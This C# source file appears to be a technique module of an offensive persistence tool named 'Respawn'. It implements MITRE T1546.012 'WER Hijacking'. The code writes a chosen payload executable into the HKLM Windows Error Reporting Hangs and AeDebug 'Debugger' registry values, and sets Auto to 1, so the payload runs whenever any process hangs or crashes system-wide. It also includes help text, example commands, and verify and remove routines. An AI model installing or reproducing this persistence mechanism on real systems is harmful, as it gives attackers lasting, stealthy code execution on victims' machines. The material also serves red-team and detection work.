using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.WerHijack
{
    public class WerHijackModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "wer";
        public string Name        => "WER Hijacking";
        public string Mitre       => "T1546.012";
        public string Description => "Persist by registering a payload as a WER debugger or exception handler fired on process crash or hang";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string HangsPath   = @"SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs";
        const string AeDebugPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  MINIMUM PRIVILEGE:");
            Console.ResetColor();
            Console.WriteLine("    Local Administrator — requires HKLM write access.\n");

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  ACTIONS:");
            Console.ResetColor();
            Console.WriteLine("    install, remove, verify, list-keys\n");

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            TechniqueHelpBuilder.RenderOption("-k,  --key",     "WER key to abuse (see list-keys)");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Path to payload executable");
            Console.WriteLine();

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();
            TechniqueHelpBuilder.RenderExample("Respawn -t wer -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t wer -a install -k hklm-debugger -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t wer -a install -k hklm-runtimeexception -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t wer -a verify  -k hklm-debugger");
            TechniqueHelpBuilder.RenderExample("Respawn -t wer -a remove  -k hklm-debugger");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return WerHijackKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            var key = WerHijackKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key '{ctx.Key}'. Use -a list-keys.");

            try
            {
                if (ctx.Key.Equals("hklm-debugger", StringComparison.OrdinalIgnoreCase))
                    return InstallHangs(ctx.Payload);
                else
                    return InstallAeDebug(ctx.Payload);
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. WER hijacking requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            var key = WerHijackKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key '{ctx.Key}'. Use -a list-keys.");

            try
            {
                if (ctx.Key.Equals("hklm-debugger", StringComparison.OrdinalIgnoreCase))
                    return RemoveHangs();
                else
                    return RemoveAeDebug();
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. WER hijacking requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            var key = WerHijackKeys.GetById(ctx.Key);
            if (key == null)
                return TechniqueResult.Fail($"Unknown key '{ctx.Key}'. Use -a list-keys.");

            try
            {
                if (ctx.Key.Equals("hklm-debugger", StringComparison.OrdinalIgnoreCase))
                    return VerifyHangs();
                else
                    return VerifyAeDebug();
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. WER hijacking requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Hangs (WER Debugger) ─────────────────────────────────────────────────

        private TechniqueResult InstallHangs(string payload)
        {
            using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(HangsPath, writable: true)
                ?? Microsoft.Win32.Registry.LocalMachine.CreateSubKey(HangsPath, writable: true);
            if (regKey == null)
                return TechniqueResult.Fail("Failed to open WER Hangs registry key.");

            var existing = regKey.GetValue("Debugger");
            if (existing != null)
                return TechniqueResult.Exists($"WER debugger already set to '{existing}'.");

            regKey.SetValue("Debugger", $"\"{payload}\" -p %ld -e %ld");

            return TechniqueResult.Ok(
                $"Installed WER hang debugger -> '{payload}' | " +
                $"Fires when any process hangs.");
        }

        private TechniqueResult RemoveHangs()
        {
            using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(HangsPath, writable: true);
            if (regKey == null)
                return TechniqueResult.NotFound("WER Hangs key not found.");

            if (regKey.GetValue("Debugger") == null)
                return TechniqueResult.NotFound("WER debugger not set.");

            regKey.DeleteValue("Debugger");
            return TechniqueResult.Ok("Removed WER hang debugger.");
        }

        private TechniqueResult VerifyHangs()
        {
            using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(HangsPath, writable: false);
            if (regKey == null)
                return TechniqueResult.NotFound("WER Hangs key not found.");

            string? value = regKey.GetValue("Debugger")?.ToString();
            if (value == null)
                return TechniqueResult.NotFound("WER debugger not set.");

            return TechniqueResult.Ok($"Verified WER hang debugger -> '{value}'");
        }

        // ─── AeDebug (Runtime Exception) ─────────────────────────────────────────

        private TechniqueResult InstallAeDebug(string payload)
        {
            using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(AeDebugPath, writable: true)
                ?? Microsoft.Win32.Registry.LocalMachine.CreateSubKey(AeDebugPath, writable: true);
            if (regKey == null)
                return TechniqueResult.Fail("Failed to open AeDebug registry key.");

            // backup existing debugger
            string? existing = regKey.GetValue("Debugger")?.ToString();
            if (existing != null && !existing.Contains("RESPAWN"))
                regKey.SetValue("RESPAWN_BACKUP", existing);

            regKey.SetValue("Debugger", $"\"{payload}\" -p %ld -e %ld");
            regKey.SetValue("Auto", "1");

            return TechniqueResult.Ok(
                $"Installed AeDebug runtime exception handler -> '{payload}' | " +
                $"Original backed up: '{existing ?? "none"}' | " +
                $"Fires on every unhandled exception system-wide.");
        }

        private TechniqueResult RemoveAeDebug()
        {
            using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(AeDebugPath, writable: true);
            if (regKey == null)
                return TechniqueResult.NotFound("AeDebug key not found.");

            string? current = regKey.GetValue("Debugger")?.ToString();
            if (current == null)
                return TechniqueResult.NotFound("AeDebug debugger not set.");

            // restore backup if exists
            string? backup = regKey.GetValue("RESPAWN_BACKUP")?.ToString();
            if (!string.IsNullOrEmpty(backup))
            {
                regKey.SetValue("Debugger", backup);
                regKey.DeleteValue("RESPAWN_BACKUP", throwOnMissingValue: false);
            }
            else
            {
                regKey.DeleteValue("Debugger", throwOnMissingValue: false);
                regKey.SetValue("Auto", "0");
            }

            return TechniqueResult.Ok($"Removed AeDebug handler | Restored: '{backup ?? "none"}'");
        }

        private TechniqueResult VerifyAeDebug()
        {
            using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(AeDebugPath, writable: false);
            if (regKey == null)
                return TechniqueResult.NotFound("AeDebug key not found.");

            string? value  = regKey.GetValue("Debugger")?.ToString();
            string? auto   = regKey.GetValue("Auto")?.ToString();
            string? backup = regKey.GetValue("RESPAWN_BACKUP")?.ToString();

            if (value == null)
                return TechniqueResult.NotFound("AeDebug debugger not set.");

            return TechniqueResult.Ok(
                $"Verified AeDebug handler -> '{value}' | " +
                $"Auto: {auto} | " +
                $"Backup: '{backup ?? "none"}'");
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (string.IsNullOrEmpty(ctx.Key))
            {
                error = "No key specified. Use -k <key-id> or see -a list-keys.";
                return false;
            }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <payload>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}